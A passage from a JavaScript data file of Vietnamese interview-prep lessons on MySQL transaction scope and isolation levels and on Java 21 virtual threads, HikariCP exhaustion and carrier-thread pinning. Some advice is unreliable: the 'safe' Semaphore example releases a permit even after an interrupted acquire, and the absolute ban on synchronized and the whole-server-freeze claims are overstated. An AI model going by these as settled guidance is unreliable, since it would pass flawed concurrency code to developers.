        // Hậu quả: Undo Log của toàn bộ MySQL bị phình to 50GB không thể giải phóng!
    }
}`,
        goodCodeTitle: '✅ Thu hẹp phạm vi Transaction tối đa và phân luồng bất đồng bộ',
        goodCode: `// ✅ 1. Chỉ mở Transaction khi thao tác Database, không bọc API mạng:
public void processLargeReportSafe() {
    // Đọc dữ liệu nhanh gọn trong read-only:
    List<UserDto> users = getActiveUsersFast();

    // 2. Tác vụ gọi mạng xử lý bất đồng bộ ngoài Transaction:
    CompletableFuture.runAsync(() -> {
        users.forEach(externalService::sendEmailNotification);
    });
}`,
        interviewTip: 'Phỏng vấn hỏi: "Sự khác biệt cốt lõi giữa Read Committed (RC) và Repeatable Read (RR) trong MVCC của MySQL là gì?". Trả lời: "Ở mức Repeatable Read, Read View chỉ được tạo ra MỘT LẦN DUY NHẤT ở câu lệnh SELECT đầu tiên và dùng lại cho toàn bộ transaction (đảm bảo đọc lại lần 2 vẫn ra dữ liệu cũ). Ở mức Read Committed, MỖI CÂU LỆNH SELECT đều tạo ra một Read View MỚI, do đó nếu có transaction khác vừa commit giữa chừng, câu SELECT tiếp theo sẽ nhìn thấy ngay dữ liệu mới đó (gây hiện tượng Non-repeatable Read)".'
      },
      {
        id: 'mysql-virtual-threads-hikaricp',
        title: '4. Virtual Threads (Java 21) & Cạm Bẫy Nghẽn HikariCP / Pinning Issue',
        badge: 'Cạm Bẫy Java 21 Hiện Đại',
        summary: 'Virtual Threads cực nhẹ, tạo 100,000 threads dễ dàng. Nhưng nếu 100,000 luồng cùng đòi kết nối DB sẽ làm nát HikariCP và từ khóa synchronized gây Pinning luồng Carrier.',
        explanation: `Từ Java 21, **Virtual Threads (Project Loom)** là bước nhảy vọt vĩ đại:
- **Platform Thread (Truyền thống):** Ánh xạ 1-1 với Kernel Thread của hệ điều hành. Mỗi thread tốn **1MB bộ nhớ Stack**, một máy tính 4GB RAM chỉ mở được tối đa 2,000 - 3,000 threads là hết RAM.
- **Virtual Thread:** Do JVM quản lý trên bộ nhớ Heap, chỉ tốn **vài trăm bytes**. Một JVM có thể mở **1,000,000 Virtual Threads** đồng thời mà không hề hấn gì!
- Khi Virtual Thread gặp tác vụ I/O blocking (gọi DB, gọi HTTP), JVM tự động tháo gỡ (Unmount) Virtual Thread đó khỏi Carrier Thread (ForkJoinPool) để nhường Carrier Thread cho tác vụ khác chạy.

**2 Cạm bẫy chết người khi đem Virtual Threads lên Production:**

**1. Cạm bẫy 1: Sập Database Connection Pool (HikariCP):**
- Trong mô hình cũ: Số lượng request đồng thời bị chặn bởi kích thước Thread Pool của Tomcat (mặc định 200 threads). Do đó HikariCP cấu hình \`maximum-pool-size: 20\` - \`50\` là đủ chạy êm ái.
- Khi bật Virtual Threads: **10,000 request ùa vào cùng lúc ➔ 10,000 Virtual Threads được sinh ra tức thì!**
- Cả 10,000 luồng cùng lao vào \`DataSource.getConnection()\`!
- Chỉ có 30 luồng lấy được kết nối, **9,970 luồng còn lại bị kẹt cứng chờ đợi trong hàng đợi của HikariCP** ➔ Ném lỗi \`ConnectionTimeoutException: Connection is not available, request timed out after 30000ms\` hàng loạt!
- **Giải pháp:** Dùng **\`Semaphore\`** giới hạn số lượng Virtual Thread được phép truy cập Database đồng thời, hoặc dùng R2DBC reactive driver.

**2. Cạm bẫy 2: Lỗi Pinning Thread (Ghim chặt Carrier Thread):**
- Khi Virtual Thread đang chạy bên trong một khối **\`synchronized\` block** hoặc gọi thư viện Native C/C++ (\`JNI\`), nếu gặp thao tác I/O blocking:
- JVM **KHÔNG THỂ THÁO GỠ (Unmount)** Virtual Thread đó ra khỏi Carrier Thread!
- Virtual Thread bị "ghim chặt" (Pinned) vào Carrier Thread thực tế của CPU. Vì Carrier Thread trong ForkJoinPool chỉ có số lượng bằng số Core CPU (ví dụ 8 cores):
- **Chỉ cần 8 Virtual Threads bị Pinning là toàn bộ server bị đóng băng hoàn toàn!**
- **Giải pháp:** **Tuyệt đối không dùng \`synchronized\`** trong code Java 21 Virtual Threads, thay thế 100% bằng **\`ReentrantLock\`**!`,
        asciiDiagram: `[MÔ HÌNH BÌNH THƯỜNG: VIRTUAL THREAD UNMOUNT KHI GẶP I/O]
Virtual Thread 1 ──> [Carrier Thread (Core 0)] ──(Gặp I/O)──> Tháo gỡ (Unmount) ✅
Carrier Thread rảnh rỗi phục vụ ngay cho Virtual Thread 2!

[CẠM BẪY PINNING: DÙNG SYNCHRONIZED BLOCK]
Virtual Thread 1 ──> synchronized { ... gọi Database I/O ... }
                                  │
                                  ▼
[Carrier Thread (Core 0)] BỊ GHIM CHẶT (PINNED)! ❌
Không thể tháo gỡ! 8 luồng CPU bị ghim ➔ TOÀN BỘ SERVER ĐƠ CỨNG! 💥`,
        badCodeTitle: '❌ Dùng synchronized trong Virtual Thread gây tê liệt Carrier Threads',
        badCode: `public class BadVirtualThreadService {
    // ❌ THẢM HỌA PINNING TRÊN JAVA 21:
    // synchronized ghim chặt Virtual Thread vào Carrier Thread khi gặp I/O!
    public synchronized String fetchDataFromRemote(String url) {
        // Lệnh gọi I/O blocking bên trong synchronized block:
        return restTemplate.getForObject(url, String.class);
    }
}`,
        goodCodeTitle: '✅ Dùng ReentrantLock và Semaphore bảo vệ Database Pool',
        goodCode: `public class SafeVirtualThreadService {
    // ✅ 1. Dùng ReentrantLock thay cho synchronized:
    // ReentrantLock tương thích 100% với Project Loom, cho phép unmount an toàn:
    private final ReentrantLock lock = new ReentrantLock();

    public String fetchDataSafe(String url) {
        lock.lock();
        try {
            return restTemplate.getForObject(url, String.class);
        } finally {
            lock.unlock();
        }
    }
}

// ✅ 2. Dùng Semaphore bảo vệ HikariCP không bị nghẽn:
@Component
public class DatabaseAccessLimiter {
    // Giới hạn tối đa 30 Virtual Threads được chạm vào DB cùng lúc:
    private final Semaphore dbSemaphore = new Semaphore(30);

    public <T> T executeWithDbPermit(Supplier<T> dbOperation) {
        try {
            dbSemaphore.acquire();
            return dbOperation.get();
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
            throw new RuntimeException("Interrupted", e);
        } finally {
            dbSemaphore.release();
        }
    }
}`,
        interviewTip: 'Làm thế nào để phát hiện xem mã nguồn có đang bị dính lỗi Pinning Thread hay không? Trả lời: "Bật cờ JVM: -Djdk.tracePinnedThreads=full khi chạy ứng dụng Java 21. Khi có bất kỳ Virtual Thread nào bị ghim vào Carrier Thread do dính synchronized block hoặc Native call lúc I/O blocking, JVM sẽ tự động in stack trace chi tiết để ta tìm đúng vị trí class cần refactor sang ReentrantLock".'
      }
    ]
  }
];

